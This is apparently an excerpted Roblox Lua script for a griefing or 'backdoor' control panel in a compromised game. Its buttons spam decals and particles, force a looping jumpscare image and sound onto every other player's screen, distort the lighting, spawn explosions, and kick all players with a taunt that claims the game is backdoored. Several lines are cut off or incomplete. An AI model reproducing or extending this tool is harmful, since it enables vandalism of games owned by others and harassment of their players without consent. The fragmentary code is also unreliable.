-- Script by Rozxino and 007n7zAlt
-- @Rozxino
-- @007n7zAlt
-- RIP to 09baRavenaa for sacrificing him self to save us..
...
Frame.BorderColor3 = Color3.fromRGB(85,0,0)
...
scriptz.BorderColor3 = Color3.fromRGB(85,0,0)
...
decalspam.BorderColor3 = Color3.fromRGB(85,0,0)
...
skybox.BorderColor3 = Color3.fromRGB(85,0,0)
...
particles.BorderColor3 = Color3.fromRGB(85,0,0)
...
jumpscare.BorderColor3 = Color3.fromRGB(85,0,0)
...
crazydisco.BorderColor3 = Color3.fromRGB(85,0,0)
...
shedletskyheads.BorderColor3 = Color3.fromRGB(85,0,0)
...
music.BorderColor3 = Color3.fromRGB(85,0,0)
...
skele.BorderColor3 = Color3.fromRGB(85,0,0)
...
shutdown.BorderColor3 = Color3.fromRGB(85,0,0)
...
unachor.BorderColor3 = Color3.fromRGB(85,0,0)
...
fire.BorderColor3 = Color3.fromRGB(85,0,0)
...
textspam.BorderColor3 = Color3.fromRGB(85,0,0)
...
hint.BorderColor3 = Color3.fromRGB(85,0,0)
...
chat.BorderColor3 = Color3.fromRGB(85,0,0)
...
parts.BorderColor3 = Color3.fromRGB(85,0,0)
...
nuke.BorderColor3 = Color3.fromRGB(85,0,0)
...
settings.BorderColor3 = Color3.fromRGB(85,0,0)
...
hintM.BorderColor3 = Color3.fromRGB(85,0,0)
...
text.BorderColor3 = Color3.fromRGB(85,0,0)
...
SettingsButton.BorderColor3 = Color3.fromRGB(85,0,0)
	...
	function click()
		function exPro(root)
			for _, v in pairs(root:GetChildren()) do
				if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=160456772" then
					v.Parent = nil
				elseif v:IsA("BasePart") then
					...
					One.Texture = "http://www.roblox.com/asset/?id=160456772"
					Two.Texture = "http://www.roblox.com/asset/?id=160456772"
					Three.Texture = "http://www.roblox.com/asset/?id=160456772"
					Four.Texture = "http://www.roblox.com/asset/?id=160456772"
					Five.Texture = "http://www.roblox.com/asset/?id=160456772"
					Six.Texture = "http://www.roblox.com/asset/?id=160456772"
					One.Face = "Front"
					Two.Face = "Back"
					Three.Face = "Right"
					Four.Face = "Left"
...
local function BRWPE_script() -- particles.Script 
	...
	script.Parent.MouseButton1Click:Connect(function()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			...
			emit.Parent = v
			emit.Texture = "http://www.roblox.com/asset/?id=160456772"
			emit.VelocitySpread = 
		end
		end)
end
		...
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
				spawn(function()
					...
					newimage.Image = "http://www.roblox.com/asset/?id=160456772"
					newimage.Size = UDim2.new(1,1,1,1)
					local s = Instance.new("Sound",newgui)
					s.SoundId = "rbxassetid://9069609200"
					s.Volume = 
					s.Looped = true
					s:Play()
...
local function MLKICL_script() -- crazydisco.Script 
	...
	script.Parent.MouseButton1Click:Connect(function()
		l = game.Lighting
		while wait() do
			l.FogColor = Color3.new(85, 85, 0)
			l.FogEnd = math.random(50, 100)
			l.FogStart = l.FogEnd
			l.TimeOfDay = "0:00:00"
			l.Brightness = -10000000000000000000000
...
local function MWJWUX_script() -- shutdown.Script 
	...
	script.Parent.MouseButton1Down:connect(function()
		for i, players in pairs(game.Players:GetChildren()) do
			players:Kick("007N7Z BACKDOORED THIS GAME LMFAOOOO")
		end
	end)
...
local function GBZF_script() -- nuke.Script 
	...
	script.Parent.MouseButton1Down:Connect(function()
		...
		explode.BlastRadius = 
		explode.BlastPressure = 
		wait(1)
		part.Parent = nil
	end)
end
